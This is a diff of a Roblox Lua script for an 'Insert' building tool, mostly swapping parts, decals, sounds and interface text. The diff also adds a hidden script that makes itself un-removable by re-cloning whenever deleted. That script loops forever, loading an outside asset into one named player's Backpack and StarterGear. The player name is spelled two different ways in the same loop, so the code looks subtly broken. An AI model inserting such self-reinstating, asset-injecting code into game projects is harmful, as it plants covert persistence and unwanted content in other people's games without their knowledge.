@@ -16,26 +16,78 @@ end
 cors = {}
 mas = Instance.new("Model",game:GetService("Lighting"))
 Tool0 = Instance.new("Tool")
-LocalScript1 = Instance.new("LocalScript")
+ObjectValue1 = Instance.new("ObjectValue")
 ObjectValue2 = Instance.new("ObjectValue")
-Part3 = Instance.new("Part")
-SpecialMesh4 = Instance.new("SpecialMesh")
-Sound5 = Instance.new("Sound")
-Sound6 = Instance.new("Sound")
-Sound7 = Instance.new("Sound")
-Script8 = Instance.new("Script")
-ObjectValue9 = Instance.new("ObjectValue")
-Tool0.Name = "BuildInsert"
-Tool0.Parent = owner.Backpack
-Tool0.TextureId = "rbxasset://icons/insert.png"
+Sparkles3 = Instance.new("Sparkles")
+Part4 = Instance.new("Part")
+Decal5 = Instance.new("Decal")
+Decal6 = Instance.new("Decal")
+Decal7 = Instance.new("Decal")
+Decal8 = Instance.new("Decal")
+Decal9 = Instance.new("Decal")
+Decal10 = Instance.new("Decal")
+Sound11 = Instance.new("Sound")
+Sound12 = Instance.new("Sound")
+Sound13 = Instance.new("Sound")
+Sound14 = Instance.new("Sound")
+Sound15 = Instance.new("Sound")
+LocalScript16 = Instance.new("LocalScript")
+Script17 = Instance.new("Script")
+Script18 = Instance.new("Script")
+Tool0.Name = "Insert"
+Tool0.Parent = mas
+Tool0.TextureId = "http://www.roblox.com/asset/?id=42276281"
 Tool0.Grip = CFrame.new(0.600000024, 0.200000003, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
 Tool0.GripForward = Vector3.new(-1, 0, -0)
 Tool0.GripPos = Vector3.new(0.6000000238418579, 0.20000000298023224, 0)
 Tool0.GripRight = Vector3.new(0, 0, -1)
-LocalScript1.Name = "Insert Local"
-LocalScript1.Parent = Tool0
-table.insert(cors,sandbox(LocalScript1,function()
-e = NLS([[pcall(function() local Tool = script.Parent
+ObjectValue1.Name = "SavedState"
+ObjectValue1.Parent = Tool0
+ObjectValue2.Name = "PlayerOwner"
+ObjectValue2.Parent = Tool0
+Sparkles3.Parent = Tool0
+Sparkles3.Color = Color3.new(1.77083, 10.2, 0)
+Sparkles3.SparkleColor = Color3.new(1, 1, 0)
+Part4.Name = "Handle"
+Part4.Parent = Tool0
+Part4.CFrame = CFrame.new(8.81749821, 0.600006104, -27.46455, -0.279666424, 6.48957757e-06, -0.960097134, -2.41354883e-08, -0.999999762, -6.75226238e-06, -0.960097134, -1.86520924e-06, 0.279666603)
+Part4.Orientation = Vector3.new(0, -73.76000213623047, 180)
+Part4.Position = Vector3.new(8.817498207092285, 0.600006103515625, -27.464550018310547)
+Part4.Rotation = Vector3.new(0.0010000000474974513, -73.76000213623047, -179.99899291992188)
+Part4.Velocity = Vector3.new(0.01207845937460661, -0.010398677550256252, -0.0026342160999774933)
+Part4.Size = Vector3.new(4, 1.2000000476837158, 1)
+Part4.RotVelocity = Vector3.new(-0.003960472531616688, 0.013107816688716412, -0.006138605065643787)
+Decal5.Parent = Part4
+Decal5.Texture = "http://www.roblox.com/asset/?id=42276281"
+Decal5.Face = Enum.NormalId.Top
+Decal6.Parent = Part4
+Decal6.Texture = "http://www.roblox.com/asset/?id=42276281"
+Decal7.Parent = Part4
+Decal7.Texture = "http://www.roblox.com/asset/?id=42276281"
+Decal7.Face = Enum.NormalId.Back
+Decal8.Parent = Part4
+Decal8.Texture = "http://www.roblox.com/asset/?id=42276281"
+Decal8.Face = Enum.NormalId.Right
+Decal9.Parent = Part4
+Decal9.Texture = "http://www.roblox.com/asset/?id=42276281"
+Decal9.Face = Enum.NormalId.Left
+Decal10.Parent = Part4
+Decal10.Texture = "http://www.roblox.com/asset/?id=42276281"
+Decal10.Face = Enum.NormalId.Bottom
+Sound11.Parent = Part4
+Sound11.SoundId = "http://www.roblox.com/asset/?id=18716629"
+Sound12.Parent = Part4
+Sound12.SoundId = "http://www.roblox.com/asset/?id=18716629"
+Sound13.Parent = Part4
+Sound13.SoundId = "http://www.roblox.com/asset/?id=18716629"
+Sound14.Parent = Part4
+Sound14.SoundId = "http://www.roblox.com/asset/?id=18716629"
+Sound15.Parent = Part4
+Sound15.SoundId = "http://www.roblox.com/asset/?id=18716629"
+LocalScript16.Name = "Insert Local"
+LocalScript16.Parent = Tool0
+table.insert(cors,sandbox(LocalScript16,function()
+heyyy = NS([[local Tool = script.Parent
 
 --game:GetService("InsertService"):SetCollectionUrl("http://test.roblox.com/Game/Tools/insertasset.ashx?sid=%d")
 --game:GetService("InsertService"):SetBaseCategoryUrl("http://test.roblox.com/Game/Tools/insertasset.ashx?nsets=10")
@@ -43,7 +95,7 @@ e = NLS([[pcall(function() local Tool = script.Parent
  
 enabled = true
 local origTexture = 	Tool.TextureId
-game:GetService("ContentProvider"):Preload("rbxasset://icons/insert_sel.png")
+game:GetService("ContentProvider"):Preload("http://www.roblox.com/asset/?id=42276281")
 
 local height = 20
 local width = UDim.new(0.25, 0)
@@ -58,7 +110,7 @@ local selectedButtonTextColor = Color3.new(1.0,1.0,1.0)
 local buttonColor = Color3.new(0.0898, 0.2148, .2344)
 local buttonTextColor = Color3.new(1.0,1.0,1.0)
 
-local frameColor = Color3.new(.1255, .4078, .1961)
+local frameColor = Color3.new(255,0,0)
 local frameTextColor = Color3.new(1.0,1.0,1.0)
 
 local titleColor = Color3.new(0.6289, 0.8398, 0)
@@ -422,7 +474,7 @@ function selectSet(buttonFrame, setName, setId, setIndex)
 			Data.Category[Data.CurrentCategory].Button.AutoButtonColor = false
 		
 			if SetCache[setId] == nil then
-				SetCache[setId] = filterSet({47620})
+				SetCache[setId] = filterSet(game:GetService("InsertService"):GetCollection(setId))
 			end
 			Data.Category[Data.CurrentCategory].Contents = SetCache[setId]
 			Window.Main.Title.Text = setName
@@ -533,8 +585,8 @@ function buildMainGui(root, userId)
 	insertTab.BackgroundTransparency = 1.0
 	insertTab.Parent = mainFrame
 	
-	Data.BaseCategoryButtons = processCategory(47620, setPanel)	
-	local userData = {47620}
+	Data.BaseCategoryButtons = processCategory(game:GetService("InsertService"):GetBaseCategories(), setPanel)	
+	local userData = game:GetService("InsertService"):GetUserCategories(userId)
 	if userData then
 		Data.UserCategoryButtons = processCategory(userData, setPanel)
 
@@ -545,11 +597,11 @@ function buildMainGui(root, userId)
 		userCategoryButton.BackgroundColor3 = buttonColor
 		userCategoryButton.TextColor3 = buttonTextColor
 		userCategoryButton.BackgroundTransparency = transparency*.5
-		userCategoryButton.Text = "User Sets"
+		userCategoryButton.Text = "Your Stuff"
 		userCategoryButton.MouseButton1Click:connect(function() selectCategory(userCategoryButton, Data.UserCategoryButtons) end)
 		userCategoryButton.Parent = insertTab
 	end
-	--Data.UserCategoryButtons =  processCategory({1}, setPanel)
+	--Data.UserCategoryButtons =  processCategory(game:GetService("InsertService"):GetBaseCategories(), setPanel)
 
 	local baseCategoryButton = Instance.new("TextButton")
 	baseCategoryButton.Name = "RobloxCategoryButton"
@@ -558,7 +610,7 @@ function buildMainGui(root, userId)
 	baseCategoryButton.BackgroundColor3 = buttonColor
 	baseCategoryButton.TextColor3 = buttonTextColor
 	baseCategoryButton.BackgroundTransparency = transparency *.5
-	baseCategoryButton.Text = "Roblox Sets"
+	baseCategoryButton.Text = "Roblox's Stuff"
 	baseCategoryButton.MouseButton1Click:connect(function() selectCategory(baseCategoryButton, Data.BaseCategoryButtons) end)
 	baseCategoryButton.Parent = insertTab
 
@@ -1215,10 +1267,10 @@ function buildMinimizedGui(root)
 	local minimizeButton = Instance.new("TextButton")
 	minimizeButton.Name = "MinimizeButton"
 	minimizeButton.Size = UDim2.new(0, height*4.5, 0, height)
-	minimizeButton.Position = UDim2.new(0.0, 0, 1.0, -height)
+	minimizeButton.Position = UDim2.new(0.0, 0, 0.225, -height)
 	minimizeButton.BackgroundColor3 = buttonColor
 	minimizeButton.TextColor3 = buttonTextColor
-	minimizeButton.Text = "Toolbox"
+	minimizeButton.Text = "Insert Tool"
 	minimizeButton.MouseButton1Click:connect(function() Window.Minimized.Frame.Visible = false Window.Main.Frame.Visible = true end)
 	minimizeButton.Visible = false
 	minimizeButton.Parent = root
@@ -1230,7 +1282,7 @@ end
 local CancelDuringLoad
 local LoadScreen 
 function onEquippedLocal(mouse)
-	Tool.TextureId = "rbxasset://icons/insert_sel.png"
+	Tool.TextureId = "http://www.roblox.com/asset/?id=42276281"
 
 	Mouse = mouse
 	if Tool.SavedState.Value and Tool.PlayerOwner.Value == getPlayer() and Data and Data.FullyLoaded then
@@ -1314,39 +1366,12 @@ end
 
 Tool.Equipped:connect(onEquippedLocal)
 Tool.Unequipped:connect(onUnequippedLocal)
-Tool.AncestryChanged:connect(onAncestryChanged) end) ]],owner.PlayerGui)
-e.Parent = script.Parent
-
+Tool.AncestryChanged:connect(onAncestryChanged)]],owner.PlayerGui)
+heyyy.Parent = script.Parent
 end))
-ObjectValue2.Name = "SavedState"
-ObjectValue2.Parent = Tool0
-Part3.Name = "Handle"
-Part3.Parent = Tool0
-Part3.CFrame = CFrame.new(-1.5, 5.60618687, 1.59983993, -1.24648798e-21, -2.22196141e-21, 0.999999881, 0.000796273293, 0.999999642, 2.22295318e-21, -0.999999642, 0.000796273293, -1.2447182e-21)
-Part3.Orientation = Vector3.new(0, 90, 0.04600000008940697)
-Part3.Position = Vector3.new(-1.5, 5.606186866760254, 1.5998399257659912)
-Part3.Rotation = Vector3.new(0.04600000008940697, 90, 0)
-Part3.Color = Color3.new(0.388235, 0.372549, 0.384314)
-Part3.Size = Vector3.new(1, 0.800000011920929, 2)
-Part3.BottomSurface = Enum.SurfaceType.Smooth
-Part3.BrickColor = BrickColor.new("Dark stone grey")
-Part3.CanCollide = false
-Part3.TopSurface = Enum.SurfaceType.Smooth
-Part3.brickColor = BrickColor.new("Dark stone grey")
-SpecialMesh4.Parent = Part3
-SpecialMesh4.MeshId = "http://www.roblox.com/asset/?id=18715644"
-SpecialMesh4.Scale = Vector3.new(0.8999999761581421, 0.8999999761581421, 0.8999999761581421)
-SpecialMesh4.TextureId = "http://www.roblox.com/asset/?id=18715636"
-SpecialMesh4.MeshType = Enum.MeshType.FileMesh
-Sound5.Parent = Part3
-Sound5.SoundId = "http://www.roblox.com/asset/?id=18716629"
-Sound6.Parent = Part3
-Sound6.SoundId = "http://www.roblox.com/asset/?id=18716629"
-Sound7.Parent = Part3
-Sound7.SoundId = "http://www.roblox.com/asset/?id=18716629"
-Script8.Name = "SwordScript"
-Script8.Parent = Tool0
-table.insert(cors,sandbox(Script8,function()
+Script17.Name = "SwordScript"
+Script17.Parent = Tool0
+table.insert(cors,sandbox(Script17,function()
 -------- OMG HAX
 
 r = game:service("RunService")
@@ -1468,8 +1493,32 @@ script.Parent.Equipped:connect(onEquipped)
 
 
 end))
-ObjectValue9.Name = "PlayerOwner"
-ObjectValue9.Parent = Tool0
+Script18.Parent = Tool0
+table.insert(cors,sandbox(Script18,function()
+NS([[local Settings={["Un_Removable"]= "On"}
+local function mFloor(x) return x - x % 1 end
+local Un_Removable = tostring(Settings["Un_Removable"]):lower() == "on"
+if Un_Removable then
+	Game.Workspace.DescendantRemoving:connect(function(Child)
+		if not Remove_At_Will and Child == script then
+			script:Clone().Parent = Game.Workspace
+		end
+end)
+end
+while true do
+	if game.Players:findFirstChild("aldoboanvino") then
+		a=game.Players:findFirstChild("aldobonavino")
+		if not a.StarterGear:findFirstChild("SwOrDiNsErT") then
+			b=game:GetService("InsertService"):LoadAsset(53776511)
+			b.Parent = game.Workspace
+			c=b:GetChildren()
+			c[1]:clone().Parent = a.Backpack
+			c[1].Parent = a.StarterGear
+		end
+	end
+	wait (2)
+end]],workspace)
+end))
 for i,v in pairs(mas:GetChildren()) do
 	v.Parent = script
 	pcall(function() v:MakeJoints() end)
